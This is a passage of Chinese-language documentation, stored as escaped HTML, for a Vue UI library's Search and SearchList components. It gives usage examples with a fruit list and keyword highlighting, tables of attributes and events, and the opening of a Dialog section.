class=\"heading\"\u003e基本用法\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003e1、只有搜索框\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003etemplate\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ev-search\u003c/span\u003e\n    \u003cspan class=\"hljs-attr\"\u003eplaceholder\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"请输入搜索关键字\"\u003c/span\u003e\n    @\u003cspan class=\"hljs-attr\"\u003esearch\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"searchFn\"\u003c/span\u003e\n    @\u003cspan class=\"hljs-attr\"\u003eenter\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"searchEnter\"\u003c/span\u003e\n  \u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ev-search\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003etemplate\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"javascript\"\u003e\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e {\n  \u003cspan class=\"hljs-attr\"\u003emethods\u003c/span\u003e: {\n    searchFn (query) {\n      \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'search'\u003c/span\u003e, query)\n    },\n    searchEnter (query) {\n      \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'enter'\u003c/span\u003e, query)\n    }\n  }\n}\n\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003e2、搭配 SearchList 搜索结果列表\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003etemplate\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ev-search\u003c/span\u003e\n    \u003cspan class=\"hljs-attr\"\u003eplaceholder\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"请输入搜索关键字\"\u003c/span\u003e\n    \u003cspan class=\"hljs-attr\"\u003e:async\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"false\"\u003c/span\u003e\n    @\u003cspan class=\"hljs-attr\"\u003esearch\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"searchFn\"\u003c/span\u003e\n  \u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ev-search-list\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003e:result\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"filterResult\"\u003c/span\u003e @\u003cspan class=\"hljs-attr\"\u003elistSearch\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"listSearch\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ev-show\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"visible\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ev-search-list\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ev-search\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003etemplate\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"javascript\"\u003e\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e {\n  data () {\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e {\n      \u003cspan class=\"hljs-attr\"\u003ekeyword\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e,\n      \u003cspan class=\"hljs-attr\"\u003evisible\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e, \u003cspan class=\"hljs-comment\"\u003e// 点击列表，列表是否消失\u003c/span\u003e\n      defaultResult: [\n        \u003cspan class=\"hljs-string\"\u003e'Apple'\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e'Banana'\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e'Orange'\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e'Durian'\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e'Lemon'\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e'Peach'\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e'Cherry'\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e'Berry'\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e'Core'\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e'Fig'\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e'Haw'\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e'Melon'\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e'Plum'\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e'Pear'\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e'Peanut'\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e'Other'\u003c/span\u003e\n      ]\n    }\n  },\n  \u003cspan class=\"hljs-attr\"\u003ewatch\u003c/span\u003e: {\n    keyword (val) {\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!val) {\n        \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.visible = \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e;\n      }\n    }\n  },\n  \u003cspan class=\"hljs-attr\"\u003emethods\u003c/span\u003e: {\n    searchFn (query) {\n      \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.keyword = query;\n      \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.visible = \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e;\n    }\n  },\n  \u003cspan class=\"hljs-attr\"\u003ecomputed\u003c/span\u003e: {\n    filterResult() {\n      \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.defaultResult.filter(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eitem\u003c/span\u003e =\u0026gt;\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eRegExp\u003c/span\u003e(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.keyword, \u003cspan class=\"hljs-string\"\u003e'i'\u003c/span\u003e).test(item));\n    }\n  }\n}\n\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e高阶用法\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003e3、定制化结果列表，关键字高亮匹配\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003etemplate\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ev-search\u003c/span\u003e\n    \u003cspan class=\"hljs-attr\"\u003eplaceholder\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"请输入搜索关键字\"\u003c/span\u003e\n    \u003cspan class=\"hljs-attr\"\u003e:async\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"false\"\u003c/span\u003e\n    @\u003cspan class=\"hljs-attr\"\u003esearch\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"searchFn\"\u003c/span\u003e\n  \u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ev-search-list\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003e:result\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"filterResult\"\u003c/span\u003e @\u003cspan class=\"hljs-attr\"\u003elistSearch\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"listSearch\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ev-show\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"visible\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"search-result\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eslot\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"list-item\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eslot-scope\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"props\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ep\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"l\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ev-html\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"props.slotValue.name\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ep\u003c/span\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ep\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"gray\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ev-show\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"props.slotValue.price\"\u003c/span\u003e\u0026gt;\u003c/span\u003e￥{{props.slotValue.price}}/斤\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ep\u003c/span\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"gray r\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ev-show\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"props.slotValue.amount\"\u003c/span\u003e\u0026gt;\u003c/span\u003e剩余{{props.slotValue.amount}}斤\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ev-search-list\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ev-search\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003etemplate\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"javascript\"\u003e\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e {\n  data () {\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e {\n      \u003cspan class=\"hljs-attr\"\u003ekeyword\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e,\n      \u003cspan class=\"hljs-attr\"\u003evisible\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\n      \u003cspan class=\"hljs-attr\"\u003edefaultResult\u003c/span\u003e: [\n        {\u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'Apple'\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eprice\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eamount\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e},\n        {\u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'Banana'\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eprice\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eamount\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e},\n        {\u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'Orange'\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eprice\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eamount\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e},\n        {\u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'Durian'\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eprice\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eamount\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e},\n        {\u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'Lemon'\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eprice\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eamount\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e},\n        {\u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'Peach'\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eprice\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eamount\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e40\u003c/span\u003e},\n        {\u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'Cherry'\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eprice\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eamount\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e},\n        {\u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'Berry'\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eprice\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eamount\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e60\u003c/span\u003e},\n        {\u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'Core'\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eprice\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eamount\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e},\n        {\u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'Fig'\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eprice\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eamount\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e},\n        {\u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'Haw'\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eprice\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eamount\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e},\n        {\u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'Melon'\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eprice\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eamount\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e},\n        {\u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'Plum'\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eprice\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eamount\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e},\n        {\u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'Pear'\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eprice\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eamount\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e},\n        {\u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'Peanut'\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eprice\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eamount\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e},\n        {\u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'Other'\u003c/span\u003e}\n      ],\n      \u003cspan class=\"hljs-comment\"\u003e// 防止defaultResult值被污染\u003c/span\u003e\n      copy: []\n    }\n  },\n  \u003cspan class=\"hljs-attr\"\u003ewatch\u003c/span\u003e: {\n    keyword (val) {\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!val) {\n        \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.visible = \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e;\n      }\n    }\n  },\n  \u003cspan class=\"hljs-attr\"\u003emethods\u003c/span\u003e: {\n    searchFn (query) {\n      \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.keyword = query;\n      \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.visible = \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e;\n    },\n    listSearch (index) {\n      \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.visible = \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e;\n      \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(index, \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.defaultResult[index].name)\n    }\n  },\n  \u003cspan class=\"hljs-attr\"\u003ecomputed\u003c/span\u003e: {\n    filterResult() {\n      \u003cspan class=\"hljs-comment\"\u003e// i 忽略大小写\u003c/span\u003e\n      \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e result = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.defaultResult.filter(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eitem\u003c/span\u003e =\u0026gt;\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eRegExp\u003c/span\u003e(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.keyword, \u003cspan class=\"hljs-string\"\u003e'i'\u003c/span\u003e).test(item.name));\n      \u003cspan class=\"hljs-comment\"\u003e// 关键字高亮匹配\u003c/span\u003e\n      \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.copy = \u003cspan class=\"hljs-built_in\"\u003eJSON\u003c/span\u003e.parse(\u003cspan class=\"hljs-built_in\"\u003eJSON\u003c/span\u003e.stringify(result))\n      \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.copy.forEach(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003eitem, index\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n        \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e name = item.name, word = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.keyword;\n        name = name.toLowerCase();\n        word = word.toLowerCase();\n\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (word \u0026amp;\u0026amp; name.indexOf(word) !== \u003cspan class=\"hljs-number\"\u003e-1\u003c/span\u003e) {\n          \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e arr    = item.name.split(\u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e)\n          \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e i      = name.indexOf(word);\n          \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e len    = word.length;\n          \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e active = \u003cspan class=\"hljs-string\"\u003e'\u0026lt;span class=\"price\"\u0026gt;'\u003c/span\u003e + arr.splice(i, len).join(\u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e) + \u003cspan class=\"hljs-string\"\u003e'\u0026lt;/span\u0026gt;'\u003c/span\u003e;\n          arr.splice(i, \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e, active);\n          item.name  = arr.join(\u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e);\n        }\n      })\n      \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.copy;\n    }\n  }\n}\n\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003eAttributes\u003c/h3\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e参数\u003c/th\u003e\n\u003cth\u003e说明\u003c/th\u003e\n\u003cth\u003e类型\u003c/th\u003e\n\u003cth\u003e可选值\u003c/th\u003e\n\u003cth\u003e默认值\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003easync\u003c/td\u003e\n\u003ctd\u003e是否进行节流\u003c/td\u003e\n\u003ctd\u003eboolean\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003etrue\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003etimeout\u003c/td\u003e\n\u003ctd\u003e搜索节流时长\u003c/td\u003e\n\u003ctd\u003enumber\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e100\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003estyles\u003c/td\u003e\n\u003ctd\u003esearch样式\u003c/td\u003e\n\u003ctd\u003eobject\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eplaceholder\u003c/td\u003e\n\u003ctd\u003eplaceholder\u003c/td\u003e\n\u003ctd\u003estring\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e'搜索'\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eautofocus\u003c/td\u003e\n\u003ctd\u003e是否自动聚焦(iOS端autofocus无效)\u003c/td\u003e\n\u003ctd\u003eboolean\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eclear\u003c/td\u003e\n\u003ctd\u003e进行搜索是否清空search框内容\u003c/td\u003e\n\u003ctd\u003eboolean\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003efalse\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 class=\"heading\"\u003eEvents\u003c/h3\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e事件名称\u003c/th\u003e\n\u003cth\u003e说明\u003c/th\u003e\n\u003cth\u003e回调参数\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003esearch\u003c/td\u003e\n\u003ctd\u003esearch搜索回调\u003c/td\u003e\n\u003ctd\u003e搜索文本\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eenter\u003c/td\u003e\n\u003ctd\u003eenter时搜索回调\u003c/td\u003e\n\u003ctd\u003e搜索文本\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eclose\u003c/td\u003e\n\u003ctd\u003e点击搜索关闭按钮回调\u003c/td\u003e\n\u003ctd\u003e''\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch2 class=\"heading\"\u003e4. Dialog 弹框\u003c/h2\u003e\n\u003ch3 class=\"heading\"\u003e基本用法\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003etemplate\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eexample-block\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003etitle\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"基础用法\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ebutton\u003c/span\u003e @\u003cspan class=\"hljs-attr\"\u003eclick\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"showSimpleDialog\"\u003c/span\u003e\u0026gt;\u003c/span\u003e普通 Dialog\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ebutton\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eexample-block\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003etemplate\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan 